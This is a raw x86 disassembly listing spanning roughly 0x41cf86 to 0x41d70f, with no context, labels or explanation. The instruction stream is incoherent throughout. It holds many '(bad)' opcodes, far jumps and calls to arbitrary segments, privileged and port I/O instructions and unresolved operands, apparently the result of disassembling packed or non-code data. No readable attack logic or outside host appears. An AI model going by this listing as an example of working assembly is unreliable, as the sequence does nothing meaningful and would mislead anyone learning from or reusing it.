  41cf86:	xlat   BYTE PTR ds:[ebx]
  41cf87:	xor    al,0x72
  41cf89:	jmp    0x9c6b:0x665964c8
  41cf90:	push   edx
  41cf91:	pop    eax
  41cf92:	lea    edi,[edi]
  41cf94:	add    DWORD PTR [eax-0x4b249332],esp
  41cf9a:	lds    esi,FWORD PTR [edi-0x58]
  41cf9d:	inc    ebx
  41cf9e:	pop    eax
  41cf9f:	(bad)  
  41cfa0:	lahf   
  41cfa1:	mov    ah,0x3
  41cfa3:	test   BYTE PTR cs:[edx],bh
  41cfa6:	leave  
  41cfa7:	ins    DWORD PTR es:[edi],dx
  41cfa8:	inc    ecx
  41cfa9:	push   ebx
  41cfaa:	inc    edi
  41cfab:	xor    eax,0xd8d3c813
  41cfb0:	sub    DWORD PTR [ebx],ebp
  41cfb2:	and    dl,0x1
  41cfb5:	xor    cl,dl
  41cfb7:	sbb    ebx,DWORD PTR [ecx-0x2f79ef58]
  41cfbd:	mov    esi,0x1f9f1f9a
  41cfc2:	xor    DWORD PTR [ecx],eax
  41cfc4:	fistp  QWORD PTR [edi+0x7f]
  41cfc7:	mov    ecx,?
  41cfc9:	cmp    BYTE PTR [edx+0x44a8a233],ah
  41cfcf:	cmp    DWORD PTR [edx+0x76],ecx
  41cfd2:	rcl    DWORD PTR [ebx+0x60],cl
  41cfd5:	mov    ds:0x3f6e0ef,al
  41cfda:	jge    0x41cf85
  41cfdc:	inc    esp
  41cfdd:	data16 stc 
  41cfdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfe0:	mov    edi,0xe4a56510
  41cfe5:	call   0x8012:0x6bf4
  41cfeb:	int    0x8a
  41cfed:	inc    esp
  41cfee:	jno    0x41cfdb
  41cff0:	inc    ebx
  41cff1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41cff3:	adc    cl,0xc5
  41cff6:	sub    DWORD PTR [edx+0x4df747ab],esi
  41cffc:	add    DWORD PTR [ebx+0x29],ebx
  41cfff:	sahf   
  41d000:	or     DWORD PTR [ecx+ebx*4+0x2e],0xa3048383
  41d008:	shr    BYTE PTR [esi+0x73],cl
  41d00b:	sub    eax,0xff322511
  41d010:	loop   0x41d055
  41d012:	push   edi
  41d013:	adc    ecx,esi
  41d015:	jmp    0x7526db24
  41d01a:	out    0x73,al
  41d01c:	daa    
  41d01d:	lmsw   WORD PTR [ecx]
  41d020:	(bad)  
  41d021:	repnz sbb al,0x8b
  41d024:	mov    ecx,0x851a86d0
  41d029:	or     eax,0x2afb03ff
  41d02e:	push   edi
  41d02f:	or     DWORD PTR [eax],0x17053896
  41d035:	sbb    DWORD PTR ds:0x9d27d2e2,eax
  41d03b:	xchg   ebp,eax
  41d03c:	je     0x41cfdb
  41d03e:	(bad)  
  41d03f:	xchg   ebx,eax
  41d040:	cmp    DWORD PTR [ebx+0x23d0ac9a],ebp
  41d046:	cmp    eax,0xc4321604
  41d04b:	mov    edx,0x4fb54cf8
  41d050:	xchg   esi,eax
  41d051:	int3   
  41d052:	jmp    0x17d282a1
  41d057:	pusha  
  41d058:	inc    edx
  41d059:	add    ebx,DWORD PTR [eax+0x2f974c90]
  41d05f:	dec    ebx
  41d060:	dec    edi
  41d061:	lea    esi,[edx+esi*8]
  41d064:	cdq    
  41d065:	push   ecx
  41d066:	sti    
  41d067:	mov    ah,BYTE PTR ds:0x98f1a414
  41d06d:	inc    esp
  41d06e:	pushf  
  41d06f:	dec    ecx
  41d070:	xlat   BYTE PTR ds:[ebx]
  41d071:	xchg   BYTE PTR [edi],ah
  41d073:	js     0x41cffb
  41d075:	mov    ch,0xb4
  41d077:	lods   al,BYTE PTR ds:[esi]
  41d078:	sbb    ah,BYTE PTR ds:0xc433004b
  41d07e:	adc    al,0xbd
  41d080:	dec    esp
  41d081:	add    esi,DWORD PTR [ecx+eiz*2]
  41d084:	packsswb mm3,QWORD PTR [esi+0x286952c8]
  41d08b:	mov    ebx,0xc25424bb
  41d090:	popf   
  41d091:	test   al,0x49
  41d093:	xor    ebx,esp
  41d095:	sub    al,dl
  41d097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d098:	xchg   esi,eax
  41d099:	sar    BYTE PTR [edi],0x5f
  41d09c:	into   
  41d09d:	cs mov bh,0x96
  41d0a0:	enter  0x43ad,0x7a
  41d0a4:	rol    DWORD PTR [edx+0x13],0x37
  41d0a8:	add    eax,0xbfec1005
  41d0ad:	into   
  41d0ae:	jp     0x41d0bd
  41d0b0:	sahf   
  41d0b1:	mov    ecx,0xef5afbd6
  41d0b6:	inc    eax
  41d0b7:	and    ebx,edi
  41d0b9:	into   
  41d0ba:	int3   
  41d0bb:	adc    al,0x96
  41d0bd:	retf   0xb854
  41d0c0:	adc    al,0x8f
  41d0c2:	inc    BYTE PTR [ecx-0x2c]
  41d0c5:	enter  0x88db,0x65
  41d0c9:	mov    ah,0x82
  41d0cb:	jae    0x41d0a3
  41d0cd:	sbb    bh,dh
  41d0cf:	cmp    DWORD PTR [edx],edx
  41d0d1:	loop   0x41d122
  41d0d3:	cmp    al,0x94
  41d0d5:	jo     0x41d0c2
  41d0d7:	or     dh,BYTE PTR ds:0xc9bf3677
  41d0dd:	cmc    
  41d0de:	inc    ecx
  41d0df:	stos   BYTE PTR es:[edi],al
  41d0e0:	push   esp
  41d0e1:	(bad)  
  41d0e2:	clc    
  41d0e3:	sbb    dh,BYTE PTR [edx-0x1ff62464]
  41d0e9:	(bad)  
  41d0ea:	jmp    0xaa11:0x1bc69be8
  41d0f1:	dec    esp
  41d0f2:	jge    0x41d169
  41d0f4:	or     BYTE PTR ds:0xdea8124d,bh
  41d0fa:	mov    ds:0xbb6afda8,al
  41d0ff:	pop    ebp
  41d100:	mov    eax,ds:0x5b950b08
  41d105:	push   esi
  41d106:	popf   
  41d107:	and    dl,BYTE PTR [edx]
  41d109:	out    dx,eax
  41d10a:	sub    eax,0xbdb902b2
  41d10f:	mov    ds:0x9e32accf,al
  41d114:	cmp    DWORD PTR ds:0x877f365e,esp
  41d11a:	ror    DWORD PTR [eax-0x1d5d56f0],1
  41d120:	shr    DWORD PTR ds:0x32b2fa31,1
  41d126:	int    0xdb
  41d128:	jno    0x41d0e9
  41d12a:	popf   
  41d12b:	mov    ah,0xc1
  41d12d:	pop    esi
  41d12e:	mov    al,0xfa
  41d130:	pop    ebx
  41d131:	ret    0x49f7
  41d134:	aaa    
  41d135:	or     DWORD PTR [edi-0x31],edi
  41d138:	mov    ebp,0xb4f38083
  41d13d:	pusha  
  41d13e:	push   ds
  41d13f:	push   ds
  41d140:	xchg   esp,eax
  41d141:	jecxz  0x41d129
  41d143:	fxch   st(1)
  41d145:	mov    edx,0xbd1ff383
  41d14a:	test   al,0xbd
  41d14c:	fsubr  QWORD PTR [ecx-0x23]
  41d14f:	fist   WORD PTR [ebp-0x711043e6]
  41d155:	push   eax
  41d156:	sbb    BYTE PTR [edi-0x42],0xfc
  41d15a:	jl     0x41d0f7
  41d15c:	xor    ebp,esi
  41d15e:	pop    ss
  41d15f:	push   ebx
  41d160:	xor    ecx,DWORD PTR [ecx]
  41d162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d163:	sub    DWORD PTR [edx],ebx
  41d165:	xchg   ecx,eax
  41d166:	or     ah,al
  41d168:	jae    0x41d139
  41d16a:	sub    eax,0xc5372169
  41d16f:	sub    al,0x38
  41d171:	(bad)  
  41d172:	adc    eax,0x1de08aa1
  41d177:	mov    ebp,0xe208f9cf
  41d17c:	lahf   
  41d17d:	and    DWORD PTR cs:[ecx-0x34dd7d66],ebp
  41d184:	clc    
  41d185:	xor    esi,DWORD PTR [ebx-0x20d2e9dc]
  41d18b:	mov    esi,0x250ebe8b
  41d190:	(bad)  
  41d191:	push   eax
  41d192:	dec    esp
  41d193:	push   edi
  41d194:	enter  0x8016,0xbc
  41d198:	xor    ebp,DWORD PTR [edi+0x34]
  41d19b:	scas   al,BYTE PTR es:[edi]
  41d19c:	cli    
  41d19d:	adc    esi,edi
  41d19f:	xlat   BYTE PTR ds:[ebx]
  41d1a0:	pop    ds
  41d1a1:	scas   eax,DWORD PTR es:[edi]
  41d1a2:	mov    dl,0x9b
  41d1a4:	sbb    BYTE PTR [edi],ah
  41d1a6:	push   cs
  41d1a7:	xchg   ecx,eax
  41d1a8:	mov    ecx,0x40f1343a
  41d1ad:	add    edx,DWORD PTR [eax]
  41d1af:	daa    
  41d1b0:	and    al,0xf5
  41d1b2:	imul   ebp,DWORD PTR [ebp-0x4c41d496],0xfffffff6
  41d1b9:	push   edx
  41d1ba:	mov    esp,0x7b6094d2
  41d1bf:	test   eax,0xf385f57e
  41d1c4:	mov    ss,WORD PTR [eax-0x1]
  41d1c7:	xor    ch,BYTE PTR [edx-0x3abd973d]
  41d1cd:	add    dl,al
  41d1cf:	push   es
  41d1d0:	pop    edi
  41d1d1:	mov    ebx,0xbf5c03ca
  41d1d6:	push   ebx
  41d1d7:	out    dx,eax
  41d1d8:	cmp    eax,ebx
  41d1da:	sbb    al,0x97
  41d1dc:	jns    0x41d22c
  41d1de:	stc    
  41d1df:	adc    eax,0x97c59495
  41d1e4:	hlt    
  41d1e5:	jge    0x41d1c0
  41d1e7:	mov    cl,0xf3
  41d1e9:	dec    esi
  41d1ea:	pop    ss
  41d1eb:	jns    0x41d213
  41d1ed:	(bad)  
  41d1ee:	dec    ecx
  41d1ef:	outs   dx,DWORD PTR ds:[esi]
  41d1f0:	mov    ah,0x86
  41d1f2:	popf   
  41d1f3:	test   eax,0x5643c88c
  41d1f8:	sbb    esp,esp
  41d1fa:	and    esp,DWORD PTR [ecx-0x23d3461b]
  41d200:	enter  0x48a2,0x17
  41d204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d205:	jne    0x41d1ba
  41d207:	pop    eax
  41d208:	jbe    0x41d26f
  41d20a:	adc    ebx,ecx
  41d20c:	test   al,0xb2
  41d20e:	dec    edi
  41d20f:	notrack call DWORD PTR [edi]
  41d212:	pop    ebp
  41d213:	out    0xd5,al
  41d215:	dec    eax
  41d216:	push   ds
  41d217:	mov    eax,ds:0x50afb1e1
  41d21c:	jp     0x41d275
  41d21e:	push   ebx
  41d21f:	ficom  WORD PTR [ebp-0x556d05f8]
  41d225:	je     0x41d202
  41d227:	sbb    eax,0x326d5b56
  41d22c:	js     0x41d1e5
  41d22e:	stc    
  41d22f:	stos   DWORD PTR es:[edi],eax
  41d230:	cmp    eax,DWORD PTR [edx-0x53]
  41d233:	lods   al,BYTE PTR ds:[esi]
  41d234:	jbe    0x41d1ef
  41d236:	sar    DWORD PTR [ebp-0x1],1
  41d239:	xchg   ebp,eax
  41d23a:	fwait
  41d23b:	mov    eax,0xf79a81aa
  41d240:	leave  
  41d241:	mov    DWORD PTR [eax-0x2d],esp
  41d244:	cmc    
  41d245:	dec    ebx
  41d246:	popa   
  41d247:	xchg   esi,eax
  41d248:	mov    dl,0xf3
  41d24a:	pusha  
  41d24b:	mov    esi,0x3678898b
  41d250:	mov    ss,WORD PTR [eax+0x14]
  41d253:	es mov bl,0x95
  41d256:	add    eax,0x824eefe2
  41d25b:	xchg   BYTE PTR [esi],ah
  41d25d:	rol    DWORD PTR [edx+0x5a3d79cb],1
  41d263:	(bad)  
  41d264:	stc    
  41d265:	cmp    eax,0xa15e0ffe
  41d26a:	test   BYTE PTR [edx-0x60],al
  41d26d:	mov    WORD PTR [eax],es
  41d26f:	jns    0x41d259
  41d271:	inc    esi
  41d272:	loopne 0x41d283
  41d274:	jmp    0x7013:0xe051d2fc
  41d27b:	mov    ds:0x74c7fe71,al
  41d280:	push   es
  41d281:	inc    edx
  41d282:	mov    ds:0xfcca8b41,al
  41d287:	mov    al,ds:0xb0d7891e
  41d28c:	sub    bl,BYTE PTR [edx+esi*8+0x3]
  41d290:	test   dl,dh
  41d292:	pop    ds
  41d293:	lds    esi,FWORD PTR [ecx]
  41d295:	mov    DWORD PTR [ebx-0x7e9c4a2c],esi
  41d29b:	mov    cl,0xa6
  41d29d:	push   ds
  41d29e:	jo     0x41d2f9
  41d2a0:	(bad)
  41d2a5:	jnp    0x41d273
  41d2a7:	jle    0x41d317
  41d2a9:	or     DWORD PTR [ecx+0x1b],edx
  41d2ac:	or     DWORD PTR [ecx+0x3b],edx
  41d2af:	add    al,0xcd
  41d2b1:	xor    eax,0x5bb871d9
  41d2b6:	xor    BYTE PTR [esi],dh
  41d2b8:	push   esi
  41d2b9:	jl     0x41d311
  41d2bb:	jb     0x41d2f0
  41d2bd:	in     al,dx
  41d2be:	dec    ebp
  41d2bf:	pop    edi
  41d2c0:	jns    0x41d32e
  41d2c2:	xchg   ebx,eax
  41d2c3:	adc    edi,DWORD PTR [edi+0x14]
  41d2c6:	mov    al,ds:0x995fab8f
  41d2cb:	out    dx,eax
  41d2cc:	inc    esi
  41d2cd:	dec    eax
  41d2ce:	mov    dl,BYTE PTR [ebx+0x4]
  41d2d1:	je     0x41d2f3
  41d2d3:	xchg   ebp,eax
  41d2d4:	push   ds
  41d2d5:	sahf   
  41d2d6:	xchg   ebx,eax
  41d2d7:	sbb    DWORD PTR [edi+0x568e5670],0xaa6de84c
  41d2e1:	pushf  
  41d2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2e3:	mov    esp,0xd8bac57d
  41d2e8:	les    esi,FWORD PTR [esi+ecx*2+0x16afac25]
  41d2ef:	popa   
  41d2f0:	inc    edx
  41d2f1:	dec    edx
  41d2f2:	sub    BYTE PTR ss:[edi],dh
  41d2f5:	xor    al,BYTE PTR ss:[esi]
  41d2f8:	hlt    
  41d2f9:	adc    BYTE PTR [edi-0x1d00c36],bl
  41d2ff:	mov    DWORD PTR [ebp+0x7973041b],eax
  41d305:	or     BYTE PTR [eax-0x57],al
  41d308:	xor    dh,BYTE PTR [esi-0x2a]
  41d30b:	add    al,0xef
  41d30d:	call   0x69af915c
  41d312:	push   ebx
  41d313:	repnz clc 
  41d315:	stos   DWORD PTR es:[edi],eax
  41d316:	xchg   ecx,eax
  41d317:	cmc    
  41d318:	push   0xffffffe6
  41d31a:	inc    ecx
  41d31b:	sti    
  41d31c:	add    BYTE PTR [esi+edi*1+0x6c],dh
  41d320:	hlt    
  41d321:	pusha  
  41d322:	daa    
  41d323:	jg     0x41d2c9
  41d325:	push   edx
  41d326:	jp     0x41d370
  41d328:	ret    0x2bfc
  41d32b:	jp     0x41d3aa
  41d32d:	(bad)  
  41d32e:	hlt    
  41d32f:	test   eax,0xc0a2d6bd
  41d334:	hlt    
  41d335:	mov    ebx,0x42cf732a
  41d33a:	dec    edi
  41d33b:	mov    al,ds:0x3e5ed977
  41d340:	xor    al,0xa0
  41d342:	jnp    0x41d382
  41d344:	mov    BYTE PTR [edx-0x3b],al
  41d347:	push   ds
  41d348:	fld    TBYTE PTR [edx+0xe7194a]
  41d34e:	test   eax,0x8e27a9f
  41d353:	test   DWORD PTR [esi+edx*1-0x8],0xa9aeb821
  41d35b:	and    al,0x90
  41d35d:	jae    0x41d379
  41d35f:	mov    edx,DWORD PTR [eax+edi*8+0x3d2de5b0]
  41d366:	adc    esp,edx
  41d368:	mov    cl,0xa
  41d36a:	in     eax,dx
  41d36b:	pop    ebp
  41d36c:	sbb    ebp,ebp
  41d36e:	cmp    cl,dl
  41d370:	out    0xbf,al
  41d372:	lahf   
  41d373:	mov    cl,0x73
  41d375:	mov    bl,0x78
  41d377:	jns    0x41d322
  41d379:	cmp    eax,DWORD PTR [esi+0x1f317534]
  41d37f:	xchg   esp,eax
  41d380:	mov    ebp,fs
  41d382:	xchg   edi,eax
  41d383:	xchg   edi,eax
  41d384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d385:	jmp    0x41d3f9
  41d387:	ret    0xedc4
  41d38a:	in     al,0x98
  41d38c:	in     al,0xdf
  41d38e:	jae    0x41d3d4
  41d390:	pop    es
  41d391:	cwde   
  41d392:	pushf  
  41d393:	sbb    DWORD PTR ds:0x492e9007,esp
  41d399:	loop   0x41d383
  41d39b:	xor    ecx,DWORD PTR [ebx]
  41d39d:	rol    BYTE PTR [ebx-0x4b],cl
  41d3a0:	fst    QWORD PTR ds:0xcca3ae82
  41d3a6:	pop    ebx
  41d3a7:	popa   
  41d3a8:	jnp    0x41d415
  41d3aa:	jnp    0x41d38d
  41d3ac:	push   cs
  41d3ad:	inc    edi
  41d3ae:	push   cs
  41d3af:	test   eax,0xc98d3cbb
  41d3b4:	outs   dx,DWORD PTR ds:[esi]
  41d3b5:	loop   0x41d370
  41d3b7:	stc    
  41d3b8:	pop    ebx
  41d3b9:	dec    esi
  41d3ba:	mov    al,ds:0x62e467ba
  41d3bf:	pop    eax
  41d3c0:	fwait
  41d3c1:	mov    al,0xaf
  41d3c3:	mov    al,ds:0xa9412e3a
  41d3c8:	pop    ebp
  41d3c9:	dec    eax
  41d3ca:	mov    bl,0xf7
  41d3cc:	ret    
  41d3cd:	mov    es,WORD PTR [esi-0x6c]
  41d3d0:	mov    al,0xd1
  41d3d2:	jno    0x41d391
  41d3d4:	or     eax,0xd9375659
  41d3d9:	add    DWORD PTR [eax],ebp
  41d3db:	or     al,0xd3
  41d3dd:	push   0xa20afeb1
  41d3e2:	neg    DWORD PTR [eax+0x4c420791]
  41d3e8:	mov    al,0xc
  41d3ea:	das    
  41d3eb:	hlt    
  41d3ec:	sub    BYTE PTR [edi+ecx*4-0x7],dl
  41d3f0:	cdq    
  41d3f1:	stos   DWORD PTR es:[edi],eax
  41d3f2:	int3   
  41d3f3:	out    0xb4,al
  41d3f5:	pop    edi
  41d3f6:	xor    al,0x5d
  41d3f8:	enter  0x23d0,0x5f
  41d3fc:	mov    eax,0x24f8cf24
  41d401:	addr16 pop ss
  41d403:	ret    
  41d404:	aam    0x22
  41d406:	imul   ebx,DWORD PTR [esi+0x27c68ec7],0xffffffc6
  41d40d:	sub    BYTE PTR [ebx],0x99
  41d410:	or     al,0x53
  41d412:	fsub   st,st(4)
  41d414:	in     eax,0x47
  41d416:	arpl   WORD PTR [ebx],dx
  41d418:	mov    ah,0xca
  41d41a:	inc    eax
  41d41b:	dec    ebp
  41d41c:	and    al,0x40
  41d41e:	lods   al,BYTE PTR ds:[esi]
  41d41f:	jge    0x41d48c
  41d421:	lock pop DWORD PTR ds:0x2b564d42
  41d428:	adc    al,0x5d
  41d42a:	sub    esi,ebx
  41d42c:	or     dh,al
  41d42e:	sbb    BYTE PTR [ebx],al
  41d430:	lods   al,BYTE PTR ds:[esi]
  41d431:	push   cs
  41d432:	stc    
  41d433:	fwait
  41d434:	sbb    edi,ebx
  41d436:	or     esp,DWORD PTR [eax-0x2a865ed9]
  41d43c:	and    eax,0x8b4715cc
  41d441:	call   0x49206da6
  41d446:	rcr    BYTE PTR ds:0x1ef00b1b,0x74
  41d44d:	adc    eax,0x9242f036
  41d452:	mov    edx,DWORD PTR [ecx-0x4e]
  41d455:	scas   eax,DWORD PTR es:[edi]
  41d456:	pop    edx
  41d457:	(bad)  
  41d458:	icebp  
  41d459:	sbb    eax,0xbe021bdf
  41d45e:	jb     0x41d451
  41d460:	ins    BYTE PTR es:[edi],dx
  41d461:	mov    ah,0xda
  41d463:	das    
  41d464:	mov    ah,0x5
  41d466:	pop    ss
  41d467:	adc    edx,DWORD PTR [ebx+ecx*1+0x3a]
  41d46b:	bound  ebx,QWORD PTR [ecx+0x3d]
  41d46e:	xor    esp,eax
  41d470:	add    cl,BYTE PTR [esi+eax*2+0x3ff50874]
  41d477:	xchg   ebx,eax
  41d478:	xchg   edx,eax
  41d479:	stos   DWORD PTR es:[edi],eax
  41d47a:	pop    ss
  41d47b:	mov    esi,0xbf682fda
  41d480:	sbb    DWORD PTR [ebx+esi*2-0x1],ebp
  41d484:	int    0x93
  41d486:	xchg   edx,eax
  41d487:	ins    BYTE PTR es:[edi],dx
  41d488:	(bad)  
  41d489:	sub    al,ah
  41d48b:	int    0xc8
  41d48d:	ret    
  41d48e:	call   0x2aed:0x2eb1dee3
  41d495:	add    eax,DWORD PTR [esi-0x5d51c043]
  41d49b:	pop    ebx
  41d49c:	sti    
  41d49d:	repnz add DWORD PTR [esi+edi*4],ecx
  41d4a1:	and    DWORD PTR [edi-0x31dc5389],0x75
  41d4a8:	fs mov edi,0x39737639
  41d4ae:	adc    eax,0x3718299e
  41d4b3:	inc    ecx
  41d4b4:	dec    esi
  41d4b5:	out    dx,eax
  41d4b6:	sbb    eax,0xd5714144
  41d4bb:	stc    
  41d4bc:	mov    edi,0x4c86d7d3
  41d4c1:	nop
  41d4c2:	fs mov bh,0x97
  41d4c5:	mov    ds:0xe39fc06d,eax
  41d4ca:	ret    0xb082
  41d4cd:	pushf  
  41d4ce:	pop    es
  41d4cf:	cmp    dl,BYTE PTR [esi]
  41d4d1:	xor    edx,ecx
  41d4d3:	push   esi
  41d4d4:	jno    0x41d551
  41d4d6:	pusha  
  41d4d7:	mov    dh,bh
  41d4d9:	in     al,dx
  41d4da:	dec    ecx
  41d4db:	pop    ebx
  41d4dc:	xchg   ecx,eax
  41d4dd:	jmp    0x4171f7a8
  41d4e2:	arpl   ax,ax
  41d4e4:	pusha  
  41d4e5:	lods   al,BYTE PTR ds:[esi]
  41d4e6:	je     0x41d518
  41d4e8:	test   ebp,ecx
  41d4ea:	retf   0xd376
  41d4ed:	stos   DWORD PTR es:[edi],eax
  41d4ee:	xchg   ebp,eax
  41d4ef:	push   ebp
  41d4f0:	dec    edx
  41d4f1:	imul   ah
  41d4f3:	cwde   
  41d4f4:	lahf   
  41d4f5:	mov    es,WORD PTR [eax-0x54]
  41d4f8:	mov    al,ds:0x37e0774b
  41d4fd:	inc    ebx
  41d4fe:	jnp    0x41d511
  41d500:	or     eax,0xb2681a84
  41d505:	outs   dx,DWORD PTR ds:[esi]
  41d506:	xor    DWORD PTR [eax+0x25f30529],esp
  41d50c:	dec    ecx
  41d50d:	inc    ecx
  41d50e:	in     eax,0x34
  41d510:	sbb    al,0x39
  41d512:	outs   dx,BYTE PTR ds:[esi]
  41d513:	cs or  esp,0x42
  41d517:	shl    BYTE PTR [ebp+0x72],0x3b
  41d51b:	loopne 0x41d509
  41d51d:	cmp    al,BYTE PTR [eax-0x1768aea5]
  41d523:	jne    0x41d595
  41d525:	clc    
  41d526:	xchg   ebx,eax
  41d527:	jb     0x41d57d
  41d529:	xchg   edx,eax
  41d52a:	adc    eax,0x6375b4ec
  41d52f:	cdq    
  41d530:	int3   
  41d531:	outs   dx,BYTE PTR ds:[esi]
  41d532:	xchg   ecx,eax
  41d533:	xchg   ebx,eax
  41d534:	retf   0x2450
  41d537:	xor    eax,0xe89694c8
  41d53c:	jmp    0xed77a728
  41d541:	xlat   BYTE PTR ds:[ebx]
  41d542:	jle    0x41d5b2
  41d544:	mov    ds:0xc7c0e2e9,eax
  41d549:	push   cs
  41d54a:	(bad)  
  41d54b:	call   0x1d43a263
  41d550:	xchg   ebx,eax
  41d551:	jecxz  0x41d4fd
  41d553:	shl    ebp,0x19
  41d556:	jne    0x41d55e
  41d558:	inc    eax
  41d559:	(bad)  
  41d55a:	out    dx,al
  41d55b:	aam    0xcf
  41d55d:	shr    DWORD PTR ds:0x7d4f72a5,cl
  41d563:	xor    BYTE PTR ds:0x3ac77a7,ah
  41d569:	stos   BYTE PTR es:[edi],al
  41d56a:	test   DWORD PTR [eax+0x3b],esp
  41d56d:	and    al,0xf4
  41d56f:	inc    ecx
  41d570:	repz add DWORD PTR [ecx-0x1496bb3c],ebp
  41d577:	pop    ds
  41d578:	inc    esi
  41d579:	jo     0x41d57d
  41d57b:	test   al,0x14
  41d57d:	xor    eax,0x4bb28116
  41d582:	xor    ebx,esi
  41d584:	aad    0xca
  41d586:	sbb    DWORD PTR ds:[esi-0x54],ecx
  41d58a:	fwait
  41d58b:	push   ebp
  41d58c:	pop    eax
  41d58d:	cli    
  41d58e:	dec    ecx
  41d58f:	cmp    ecx,DWORD PTR [eax+ebp*2]
  41d592:	add    dl,BYTE PTR ds:0xf5053ac9
  41d598:	push   cs
  41d599:	mov    esp,0xc7a605b2
  41d59e:	sbb    ah,BYTE PTR [eax-0x15]
  41d5a1:	js     0x41d605
  41d5a3:	mov    ds:0x21174b9b,al
  41d5a8:	add    DWORD PTR [esi+edx*4-0xb5b0478],ecx
  41d5af:	fisttp DWORD PTR [ebp+edi*1+0x7ab69eb7]
  41d5b6:	out    0xef,eax
  41d5b8:	clc    
  41d5b9:	enter  0x9fa5,0x9c
  41d5bd:	mov    dl,0x22
  41d5bf:	sub    eax,0xdc5efd4
  41d5c4:	jecxz  0x41d5de
  41d5c6:	xchg   ecx,eax
  41d5c7:	ss dec edx
  41d5c9:	pop    eax
  41d5ca:	cli    
  41d5cb:	pop    edi
  41d5cc:	jae    0x41d638
  41d5ce:	cmp    eax,0x5841e5a8
  41d5d3:	xor    eax,0xa7e15bbb
  41d5d8:	xchg   ebx,eax
  41d5d9:	push   cs
  41d5da:	push   ebx
  41d5db:	lahf   
  41d5dc:	or     dl,BYTE PTR [edi-0x4]
  41d5df:	jmp    0x41d651
  41d5e1:	shr    BYTE PTR [ebp+0x7cc02822],cl
  41d5e7:	lahf   
  41d5e8:	fdiv   QWORD PTR [ebx]
  41d5ea:	pop    esi
  41d5eb:	pop    esi
  41d5ec:	cmp    DWORD PTR [edi+0x423b6be3],edx
  41d5f2:	mov    edx,ebx
  41d5f4:	jle    0x41d639
  41d5f6:	or     al,0x2e
  41d5f8:	cmp    DWORD PTR [edx],ebp
  41d5fa:	call   0x46bc28eb
  41d5ff:	ret    
  41d600:	xor    esi,DWORD PTR [ebx-0x4d]
  41d603:	inc    esi
  41d604:	mov    esp,0xabba27cd
  41d609:	add    eax,0xa9a6ee1d
  41d60e:	xor    eax,0x733f588f
  41d613:	sbb    eax,0xaa8d95d0
  41d618:	add    eax,DWORD PTR [edi+esi*2+0x1d]
  41d61c:	mov    dl,BYTE PTR [esi+0x26154be9]
  41d622:	sub    eax,0xd0432a42
  41d627:	and    al,0xfd
  41d629:	shl    DWORD PTR [edx+0x5e],cl
  41d62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d62d:	stc    
  41d62e:	call   0x9ed7:0xc8a8fead
  41d635:	dec    esi
  41d636:	das    
  41d637:	sbb    edi,edi
  41d639:	and    cl,BYTE PTR [eax-0x6b4d7ba1]
  41d63f:	or     dh,BYTE PTR [esi]
  41d641:	add    esi,DWORD PTR cs:[ebp-0x4f]
  41d645:	sti    
  41d646:	lea    ebx,[ecx+0x71dc8917]
  41d64c:	push   cs
  41d64d:	cmp    al,0xff
  41d64f:	jecxz  0x41d65b
  41d651:	dec    edx
  41d652:	cmp    eax,0xa3ccde90
  41d657:	js     0x41d5f7
  41d659:	aam    0xb3
  41d65b:	mov    edi,0xe1470aab
  41d660:	retf   
  41d661:	dec    edx
  41d662:	aad    0xd5
  41d664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d665:	add    bh,cl
  41d667:	cmp    edi,DWORD PTR [edi+0x7fc85741]
  41d66d:	pop    esp
  41d66e:	fstp   QWORD PTR [ebp+0x55]
  41d671:	dec    edx
  41d672:	icebp  
  41d673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d674:	mov    ch,0xd3
  41d676:	cli    
  41d677:	dec    eax
  41d678:	shl    DWORD PTR [esi-0x16],0x41
  41d67c:	add    esi,esp
  41d67e:	mov    ah,0x5d
  41d680:	mov    ecx,0x8605b3ca
  41d685:	sbb    ebx,DWORD PTR [di]
  41d688:	(bad)  
  41d689:	mov    DWORD PTR [edi+edi*2-0x1d],esi
  41d68d:	jnp    0x41d6de
  41d68f:	cmp    edi,DWORD PTR [eax+0x448b29f2]
  41d695:	mov    eax,ds:0xaf68cb60
  41d69a:	lahf   
  41d69b:	jb     0x41d644
  41d69d:	hlt    
  41d69e:	(bad)  
  41d6a0:	cld    
  41d6a1:	mov    ?,WORD PTR [ebp+edi*4+0xa]
  41d6a5:	test   eax,0x81410ebe
  41d6aa:	add    dh,BYTE PTR [edx-0x71e4fd4]
  41d6b0:	sbb    DWORD PTR [esi],esp
  41d6b2:	xchg   ebx,eax
  41d6b3:	ret    
  41d6b4:	jb     0x41d6f4
  41d6b6:	pop    edi
  41d6b7:	pop    esi
  41d6b8:	jns    0x41d6f6
  41d6ba:	adc    ebx,0xa120b6df
  41d6c0:	inc    esi
  41d6c1:	fs push esp
  41d6c3:	addr16 fcompp 
  41d6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6c7:	scas   al,BYTE PTR es:[edi]
  41d6c8:	jge    0x41d70f
  41d6ca:	(bad)  
  41d6cb:	ins    BYTE PTR es:[edi],dx
  41d6cc:	mov    al,BYTE PTR [eax-0x3aeeb8b3]
  41d6d2:	fistp  QWORD PTR ds:0x6d2d0dff
  41d6d8:	imul   ebp,DWORD PTR [edi+eiz*1+0x53],0x208171c7
  41d6e0:	add    BYTE PTR [esi+0x34197306],bh
  41d6e6:	pop    es
  41d6e7:	push   ecx
  41d6e8:	push   0xedaafc9e
  41d6ed:	xchg   esi,eax
  41d6ee:	out    0xf0,al
  41d6f0:	in     eax,dx
  41d6f1:	jmp    0xe564:0x7251845
  41d6f8:	xchg   edi,eax
  41d6f9:	inc    esi
  41d6fa:	fidivr DWORD PTR [esi]
  41d6fc:	push   es
  41d6fd:	jge    0x41d71c
  41d6ff:	pop    ecx
  41d700:	xlat   BYTE PTR es:[ebx]
  41d702:	dec    edx
  41d703:	les    ebx,FWORD PTR [eax-0x11]
  41d706:	rcr    DWORD PTR [edi+eax*1],cl
  41d709:	pop    ebp
  41d70a:	mov    esi,0x1f14b3d6
  41d70f:	popf   
